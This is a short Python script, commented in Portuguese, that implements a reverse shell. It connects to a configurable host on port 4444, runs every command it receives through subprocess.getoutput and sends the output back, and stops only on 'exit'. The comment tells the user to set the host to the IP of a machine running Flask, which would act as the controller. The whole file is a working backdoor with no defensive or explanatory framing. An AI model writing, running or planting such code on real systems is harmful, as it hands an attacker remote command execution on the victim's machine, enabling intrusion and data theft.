import socket
import subprocess
import os

HOST = '127.0.0.1'  # Coloque o IP da máquina com Flask rodando
PORT = 4444

s = socket.socket()
s.connect((HOST, PORT))

while True:
    comando = s.recv(1024).decode().strip()
    if comando.lower() == 'exit':
        break

    if comando:
        output = subprocess.getoutput(comando)
        s.send(output.encode())

s.close()

